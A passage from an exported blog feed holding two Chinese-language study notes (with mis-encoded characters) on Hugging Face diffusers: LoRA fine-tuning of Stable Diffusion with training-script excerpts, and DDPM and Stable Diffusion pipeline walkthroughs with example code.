        <content type="html"><![CDATA[<p><a href="https://arxiv.org/abs/2106.09685">LoRA: Low-Rank Adaptation of Large Language Models</a></p><p>æœ€ç›´ç™½çš„è§£é‡Šå°±æ˜¯å¤§æ¨¡å‹é‡æ–°è®­ç»ƒå› ä¸ºå‚æ•°è¿‡å¤šè¿‡äºè€—è´¹æ—¶é—´,é‡æ–°è®­ç»ƒæ¥åšå¾®è°ƒæ˜¯ä¸å¯å–çš„.</p><p>æ›´åŠ èƒ½æ¥å—çš„æ–¹å¼æ˜¯æˆ‘ä»¬ç»™æ¨¡å‹å¢åŠ ä¸€ä¸ªadapteræ¥ä½œä¸ºè¾…åŠ©æ¨¡å‹,æˆ‘ä»¬ä¸ç”¨å®Œå…¨é‡æ–°è®­ç»ƒæ¨¡å‹,åªéœ€è¦åœ¨æ¨¡å‹ä¸Šé¢æŠŠadapterè®­ç»ƒå¥½å³å¯è®©æ¨¡å‹èƒ½å¤Ÿæœç€æˆ‘ä»¬éœ€è¦çš„æ–¹å‘å·¥ä½œ.</p><blockquote><p>It works by inserting a smaller number of new weights into the model and only these are trained. This makes training with LoRA much faster, memory-efficient, and produces smaller model weights (a few hundred MBs), which are easier to store and share.</p></blockquote><p>å®˜æ–¹åœ°å€: <a href="https://huggingface.co/docs/diffusers/training/lora">https://huggingface.co/docs/diffusers/training/lora</a></p><h1 id="script-level">script level</h1><h2 id="install">install</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/huggingface/diffusers</span><br><span class="line"><span class="built_in">cd</span> diffusers</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> examples/text_to_image</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><h2 id="script">script</h2><p>å…¶å®å¤§éƒ¨åˆ†éƒ½æ²¡å•¥å¥½çœ‹çš„,ä¸»è¦ä¹Ÿå°±æ˜¯å‡ ä¸ªè‡ªå®šä¹‰çš„ç‚¹</p><h2 id="scheduler-tokenizer">scheduler, tokenizer</h2><p>ä½ç½®:</p><p><a href="https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L567">https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L567</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Load scheduler, tokenizer and models.</span></span><br><span class="line">noise_scheduler = DDPMScheduler.from_pretrained(args.pretrained_model_name_or_path, subfolder=<span class="string">&quot;scheduler&quot;</span>)</span><br><span class="line">tokenizer = CLIPTokenizer.from_pretrained(</span><br><span class="line">    args.pretrained_model_name_or_path, subfolder=<span class="string">&quot;tokenizer&quot;</span>, revision=args.revision</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="unet">UNet</h2><p>ä½ç½®:</p><p><a href="https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L599">https://github.com/huggingface/diffusers/blob/main/examples/text_to_image/train_text_to_image.py#L599</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unet = UNet2DConditionModel.from_pretrained(</span><br><span class="line">    args.pretrained_model_name_or_path, subfolder=<span class="string">&quot;unet&quot;</span>, revision=args.non_ema_revision</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Freeze vae and text_encoder and set unet to trainable</span></span><br><span class="line">vae.requires_grad_(<span class="literal">False</span>)</span><br><span class="line">text_encoder.requires_grad_(<span class="literal">False</span>)</span><br><span class="line">unet.train()</span><br></pre></td></tr></table></figure><h2 id="text-processing">text processing</h2><p>ä½ç½®:</p><p><a href="https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L724">https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L724</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize_captions</span>(<span class="params">examples, is_train=<span class="literal">True</span></span>):</span><br><span class="line">        captions = []</span><br><span class="line">        <span class="keyword">for</span> caption <span class="keyword">in</span> examples[caption_column]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(caption, <span class="built_in">str</span>):</span><br><span class="line">                captions.append(caption)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(caption, (<span class="built_in">list</span>, np.ndarray)):</span><br><span class="line">                <span class="comment"># take a random caption if there are multiple</span></span><br><span class="line">                captions.append(random.choice(caption) <span class="keyword">if</span> is_train <span class="keyword">else</span> caption[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(</span><br><span class="line">                    <span class="string">f&quot;Caption column `<span class="subst">&#123;caption_column&#125;</span>` should contain either strings or lists of strings.&quot;</span></span><br><span class="line">                )</span><br><span class="line">        inputs = tokenizer(</span><br><span class="line">            captions, max_length=tokenizer.model_max_length, padding=<span class="string">&quot;max_length&quot;</span>, truncation=<span class="literal">True</span>, return_tensors=<span class="string">&quot;pt&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> inputs.input_ids</span><br></pre></td></tr></table></figure><h2 id="image-processing">image processing</h2><p>ä½ç½®:</p><p><a href="https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L742">https://github.com/huggingface/diffusers/blob/8959c5b9dec1c94d6ba482c94a58d2215c5fd026/examples/text_to_image/train_text_to_image.py#L742</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Preprocessing the datasets.</span></span><br><span class="line">train_transforms = transforms.Compose(</span><br><span class="line">    [</span><br><span class="line">        transforms.Resize(args.resolution, interpolation=transforms.InterpolationMode.BILINEAR),</span><br><span class="line">        transforms.CenterCrop(args.resolution) <span class="keyword">if</span> args.center_crop <span class="keyword">else</span> transforms.RandomCrop(args.resolution),</span><br><span class="line">        transforms.RandomHorizontalFlip() <span class="keyword">if</span> args.random_flip <span class="keyword">else</span> transforms.Lambda(<span class="keyword">lambda</span> x: x),</span><br><span class="line">        transforms.ToTensor(),</span><br><span class="line">        transforms.Normalize([<span class="number">0.5</span>], [<span class="number">0.5</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="run-result">run &amp; result</h2><p>å®˜æ–¹ç»™å‡ºçš„å®å¯æ¢¦æ¨¡å‹è®­ç»ƒ, å­¦æ ¡æœºå™¨åœ¨è¢«ç”¨å¹¶ä¸èƒ½è·‘. å¾ˆå¯æƒœçœ‹ä¸äº†ç»“æœäº†.</p><p>å€¼å¾—ä¸€æå®˜æ–¹å¹³å°ä¹Ÿæœ‰å¾ˆå¤šå…¶ä»–äººä¸Šä¼ çš„datasetå¯ä»¥è‡ªå®šä¹‰ä½¿ç”¨.</p><p><a href="https://huggingface.co/datasets">https://huggingface.co/datasets</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> MODEL_NAME=<span class="string">&quot;runwayml/stable-diffusion-v1-5&quot;</span></span><br><span class="line"><span class="built_in">export</span> dataset_name=<span class="string">&quot;lambdalabs/pokemon-blip-captions&quot;</span></span><br><span class="line"></span><br><span class="line">accelerate launch --mixed_precision=<span class="string">&quot;fp16&quot;</span>  train_text_to_image.py \</span><br><span class="line">  --pretrained_model_name_or_path=<span class="variable">$MODEL_NAME</span> \</span><br><span class="line">  --dataset_name=<span class="variable">$dataset_name</span> \</span><br><span class="line">  --use_ema \</span><br><span class="line">  --resolution=512 --center_crop --random_flip \</span><br><span class="line">  --train_batch_size=1 \</span><br><span class="line">  --gradient_accumulation_steps=4 \</span><br><span class="line">  --gradient_checkpointing \</span><br><span class="line">  --max_train_steps=15000 \</span><br><span class="line">  --learning_rate=1e-05 \</span><br><span class="line">  --max_grad_norm=1 \</span><br><span class="line">  --enable_xformers_memory_efficient_attention</span><br><span class="line">  --lr_scheduler=<span class="string">&quot;constant&quot;</span> --lr_warmup_steps=0 \</span><br><span class="line">  --output_dir=<span class="string">&quot;sd-pokemon-model&quot;</span> \</span><br><span class="line">  --push_to_hub</span><br></pre></td></tr></table></figure><p>ç»“æœå¯ä»¥è°ƒç”¨æŸ¥çœ‹. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> StableDiffusionPipeline</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipeline = StableDiffusionPipeline.from_pretrained(<span class="string">&quot;path/to/saved_model&quot;</span>, torch_dtype=torch.float16, use_safetensors=<span class="literal">True</span>).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line">image = pipeline(prompt=<span class="string">&quot;yoda&quot;</span>).images[<span class="number">0</span>]</span><br><span class="line">image.save(<span class="string">&quot;yoda-pokemon.png&quot;</span>)</span><br></pre></td></tr></table></figure></p><h1 id="load-adapter">Load adapter</h1><p>è„šæœ¬å±‚é¢çš„ç†è§£æ˜¯ä¸ºäº†èƒ½è°ƒåˆ¶å‡ºæˆ‘ä»¬è‡ªå·±æƒ³è¦çš„æ¨¡å‹, å¦‚æœæ˜¯æœ‰ç°æœ‰çš„LoRA weightçš„è¯ä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œå¯¼å…¥.</p><h2 id="å¯ç”¨ä»“åº“">å¯ç”¨ä»“åº“</h2><p>ç°æœ‰æ¨¡å‹:</p><p><a href="https://huggingface.co/spaces/sd-concepts-library/stable-diffusion-conceptualizer">stable-diffusion-conceptualizer</a>, <a href="https://huggingface.co/spaces/multimodalart/LoraTheExplorer">LoraTheExplorer</a>.</p><p>ä»“åº“: <a href="https://huggingface.co/spaces/huggingface-projects/diffusers-gallery">diffusers-gallery</a>, <a href="https://civitai.com/">civitai</a></p><h2 id="å‡ ä¸ªä¸åŒæ¨¡å‹">å‡ ä¸ªä¸åŒæ¨¡å‹</h2><p>ä¹Ÿå¯ä»¥ç›´æ¥çœ‹youtubeè§†é¢‘. <a href="https://www.youtube.com/watch?v=dVjMiJsuR5o">LoRA vs Dreambooth vs Textual Inversion vs Hypernetworks</a></p><h3 id="dreambooth">DreamBooth</h3><p>é€šè¿‡åŒç‰©å“çš„å‡ å¼ å›¾ç‰‡ä»¥åŠunique identifierç”Ÿæˆå…¶ä»–åŒ…å«æ­¤ç‰©å“çš„å›¾ç‰‡.</p><p>è®­ç»ƒæ–¹å¼ä¸ºæ•´ä¸ªæ¨¡å‹è®­ç»ƒ, å³tokenizer, text embedding,ä»¥åŠæœ€åçš„UNetéƒ½éœ€è¦è¿›è¡Œè®­ç»ƒ.</p><p>æœ¬è´¨ä¸ºåœ¨åŸæ¨¡å‹åŸºç¡€ä¸Šé‡æ–°å¼ºè¡Œè®­ç»ƒä¸€ä¸ªidentiferç»™ä¸€ä¸ªæ–°ç‰¹å¾, æ˜¯ä¸€ä¸ªå•ç‹¬çš„å…¨æ–°çš„æ¨¡å‹.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(<span class="string">&quot;sd-dreambooth-library/herge-style&quot;</span>, torch_dtype=torch.float16).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">prompt = <span class="string">&quot;A cute herge_style brown bear eating a slice of pizza, stunning color scheme, masterpiece, illustration&quot;</span></span><br><span class="line">image = pipeline(prompt).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure><h3 id="textual-inversion">Textual inversion</h3><p>åŒæ ·æ˜¯å°†ç‰¹å®šç‰©å“æˆ–é£æ ¼å’Œidentifierè¿›è¡Œå…³è”. ä½†æ˜¯Textual inversionæ˜¯ä»textçš„è§’åº¦å‡ºå‘,å°†æ¨¡å‹çš„æ–‡æœ¬å¤„ç†éƒ¨åˆ†è®­ç»ƒåˆ°èƒ½å¤Ÿå•ç‹¬è¾“å‡ºä¸€ä¸ªå‘é‡ç»™æŸç‰¹å®šidentifierä»è€Œè®©generatorç”Ÿæˆç›¸å…³å›¾ç‰‡.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># load stable diffusion</span></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(<span class="string">&quot;runwayml/stable-diffusion-v1-5&quot;</span>, torch_dtype=torch.float16).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># load textual inversion</span></span><br><span class="line">pipeline.load_textual_inversion(<span class="string">&quot;sd-concepts-library/gta5-artwork&quot;</span>)</span><br><span class="line">prompt = <span class="string">&quot;A cute brown bear eating a slice of pizza, stunning color scheme, masterpiece, illustration, &lt;gta5-artwork&gt; style&quot;</span></span><br><span class="line">image = pipeline(prompt).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure><h3 id="lora">LoRA</h3><p>é€šè¿‡å¤–åµŒadapter,å±€éƒ¨å¾®è°ƒä»è€Œä½¿å¾—æ¨¡å‹å¯ä»¥æœæŸä¸ªæ–¹å‘å·¥ä½œ. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="comment"># load stable diffusion</span></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(<span class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># load lora</span></span><br><span class="line">pipeline.load_lora_weights(<span class="string">&quot;ostris/super-cereal-sdxl-lora&quot;</span>, weight_name=<span class="string">&quot;cereal_box_sdxl_v1.safetensors&quot;</span>)</span><br><span class="line">prompt = <span class="string">&quot;bears, pizza bites&quot;</span></span><br><span class="line">image = pipeline(prompt).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure></p><p>å¤§æ¦‚ä¹Ÿå°±æ˜¯è¿™äº›äº†,ä¸‹æ¬¡æœ‰ç©ºçœ‹ä¸€ä¸‹PEFT,ç„¶åçœ‹ä¸‹LoRAåœ¨GPTå±‚é¢çš„åº”ç”¨.</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Diffuserså­¦ä¹ (1)</title>
      <link href="/2024/04/21/Diffusers%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/04/21/Diffusers%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p>ldmçš„VQGANè¿˜åœ¨è·‘,å…ˆæ¥çœ‹ä¸‹huggingfaceç°æœ‰çš„diffusion modelçš„å®ç°æ¡†æ¶.</p><p><a href="https://huggingface.co/docs/diffusers/using-diffusers/write_own_pipeline">æ–‡æ¡£é“¾æ¥</a></p><h2 id="diffusion-modelddpm">diffusion model(ddpm)</h2><h3 id="install">install</h3><p>é¦–å…ˆå®‰è£…å’Œimport <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!pip install diffusers[<span class="string">&quot;torch&quot;</span>] transformers</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> DDPMPipeline</span><br></pre></td></tr></table></figure></p><h3 id="pipline">pipline</h3><p>piplineç®€æ´ä»£ç  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ddpm = DDPMPipeline.from_pretrained(<span class="string">&quot;google/ddpm-cat-256&quot;</span>, use_safetensors=<span class="literal">True</span>).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">image = ddpm(num_inference_steps=<span class="number">30</span>).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure></p><p><img src="pipline.png" /></p><p>æ•ˆæœå…¶å®ä¸€èˆ¬.</p><h3 id="å†…éƒ¨ç»†èŠ‚">å†…éƒ¨ç»†èŠ‚</h3><p>è¿˜æ˜¯å’Œå‰é¢çœ‹çš„ddpmä¸€æ ·, UnetåŠ ä¸Šä¸€ä¸ªscheduler. å¯¹ç”Ÿæˆç»“æœè¿›è¡Œç»˜å›¾å¾—åˆ°ä»¥ä¸‹ç»“æœ. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> DDPMScheduler, UNet2DModel</span><br><span class="line"></span><br><span class="line">scheduler = DDPMScheduler.from_pretrained(<span class="string">&#x27;google/ddpm-cat-256&#x27;</span>)</span><br><span class="line">model = UNet2DModel.from_pretrained(<span class="string">&#x27;google/ddpm-cat-256&#x27;</span>, use_safetensors=<span class="literal">True</span>).to(<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">scheduler.set_timesteps(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">noice = torch.randn((<span class="number">1</span>,<span class="number">3</span>,model.config.sample_size,model.config.sample_size), device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">img_index = <span class="number">0</span></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>))</span><br><span class="line"><span class="keyword">for</span> i, t <span class="keyword">in</span> <span class="built_in">enumerate</span>(scheduler.timesteps):</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        noisy_residual = model(noice, t).sample</span><br><span class="line">    previous_noisy_sample = scheduler.step(noisy_residual, t, noice).prev_sample</span><br><span class="line">    noice = previous_noisy_sample</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        image = (noice / <span class="number">2</span> + <span class="number">0.5</span>).clamp(<span class="number">0</span>, <span class="number">1</span>).squeeze()</span><br><span class="line">        image = (image.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>) * <span class="number">255</span>).<span class="built_in">round</span>().to(torch.uint8).cpu().numpy()</span><br><span class="line">        image = Image.fromarray(image)</span><br><span class="line">        plt.subplot(<span class="number">1</span>, <span class="number">10</span>, i//<span class="number">10</span>+<span class="number">1</span>)</span><br><span class="line">        plt.imshow(image)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p><p><img src="plot_5img.png" /></p><h2 id="stable-diffusion">stable diffusion</h2><h3 id="pipline-1">pipline</h3><p><a href="https://huggingface.co/docs/diffusers/using-diffusers/conditional_image_generation">Text-to-image</a></p><p>æœ‰stable diffusion1.5, stable diffusion XLç­‰ç­‰ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoPipelineForText2Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">pipeline = AutoPipelineForText2Image.from_pretrained(</span><br><span class="line">    <span class="string">&quot;stabilityai/stable-diffusion-xl-base-1.0&quot;</span>, torch_dtype=torch.float16, variant=<span class="string">&quot;fp16&quot;</span></span><br><span class="line">).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">generator = torch.Generator(<span class="string">&quot;cuda&quot;</span>).manual_seed(<span class="number">31</span>)</span><br><span class="line">image = pipeline(<span class="string">&quot;a bowl of cats, cute&quot;</span>, generator=generator).images[<span class="number">0</span>]</span><br><span class="line">image</span><br></pre></td></tr></table></figure></p><p><img src="stable_diffusion_XL.png" /></p><h3 id="pndmpseudo-numerical-methods-for-diffusion-models-on-manifolds">PNDM(Pseudo Numerical Methods for Diffusion Models on Manifolds)</h3><p>schedulerä¹Ÿæ˜¯æœ‰ä¸å°‘çš„,ä»ddpmåˆ°ddimåˆ°pndm,å…·ä½“å¯ä»¥çœ‹<a href="https://animadversio.github.io/academic_notes/note-on-ddpm-ddim-pndm">Note on Variants of Diffusion Scheduler, DDPM DDIM PNDM</a>.</p><p>å¤§æ¦‚æ¥è¯´å°±æ˜¯ddpmåŸºäºmarkov,ddimæ˜¯deterministicä¸”å¯¹back processåšäº†ä¼˜åŒ–. pndmæ˜¯å¯¹ddimåšå‡ºäº†å¾®åˆ†æ–¹ç¨‹æ±‚è§£å±‚é¢çš„ä¼˜åŒ–.</p><p>ä¸è¿‡å®˜æ–¹ç»™çš„è¯´æ³•æ˜¯stable diffusioné»˜è®¤ç”¨pndm,é‚£æˆ‘ä»¬å°±å±•ç°ä¸€ä¸‹æ¢scheduleræœ‰å¤šç®€å•,äºæ˜¯ç”¨çš„å°±æ˜¯UniPCMultistepScheduler.</p><h3 id="load-from-pretrained">load from pretrained</h3><p>è¿™é‡ŒåŒºåˆ«äºå‰é¢çš„UNet,è¿™é‡Œçš„UNetæ˜¯conditional. ç„¶åencoderç”¨çš„AutoencoderKL.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> CLIPTextModel, CLIPTokenizer</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> AutoencoderKL, UNet2DConditionModel, PNDMScheduler</span><br><span class="line"><span class="keyword">from</span> diffusers <span class="keyword">import</span> UniPCMultistepScheduler</span><br><span class="line"></span><br><span class="line">vae = AutoencoderKL.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;vae&quot;</span>, use_safetensors=<span class="literal">True</span>)</span><br><span class="line">tokenizer = CLIPTokenizer.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;tokenizer&quot;</span>)</span><br><span class="line">text_encoder = CLIPTextModel.from_pretrained(</span><br><span class="line">    <span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;text_encoder&quot;</span>, use_safetensors=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line">unet = UNet2DConditionModel.from_pretrained(</span><br><span class="line">    <span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;unet&quot;</span>, use_safetensors=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line">scheduler = UniPCMultistepScheduler.from_pretrained(<span class="string">&quot;CompVis/stable-diffusion-v1-4&quot;</span>, subfolder=<span class="string">&quot;scheduler&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line">vae.to(torch_device)</span><br><span class="line">text_encoder.to(torch_device)</span><br><span class="line">unet.to(torch_device)</span><br></pre></td></tr></table></figure><h3 id="text-processing">text processing</h3><p>æ–‡æœ¬æ–¹é¢å°±æ˜¯å…ˆtokenizeç„¶åembedding,ç„¶åå–padding tokenå†åšä¸€æ¬¡embeddingæœ€åconcat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># text processing</span></span><br><span class="line">prompt = [<span class="string">&quot;a photograph of a bowl of cats&quot;</span>]</span><br><span class="line">batch_size = <span class="built_in">len</span>(prompt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tokenizing</span></span><br><span class="line">text_input = tokenizer(</span><br><span class="line">    prompt, padding=<span class="string">&quot;max_length&quot;</span>, max_length=tokenizer.model_max_length, truncation=<span class="literal">True</span>, return_tensors=<span class="string">&quot;pt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># generate text embedding</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    text_embeddings = text_encoder(text_input.input_ids.to(torch_device))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate text embedding for only padding tokens</span></span><br><span class="line">max_length = text_input.input_ids.shape[-<span class="number">1</span>]</span><br><span class="line">uncond_input = tokenizer([<span class="string">&quot;&quot;</span>] * batch_size, padding=<span class="string">&quot;max_length&quot;</span>, max_length=max_length, return_tensors=<span class="string">&quot;pt&quot;</span>)</span><br><span class="line">uncond_embeddings = text_encoder(uncond_input.input_ids.to(torch_device))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># concat embeddings</span></span><br><span class="line">text_embeddings = torch.cat([uncond_embeddings, text_embeddings])</span><br></pre></td></tr></table></figure><h3 id="train">train</h3><p>è¿™é‡Œå®˜æ–¹çš„generatorä¼šå‡ºé—®é¢˜,ç”¨cudaçš„è¯è®°å¾—ç”¨<code>torch.cuda.manual_seed</code></p><p>ç„¶åæ€è·¯å¾ˆç®€å•, 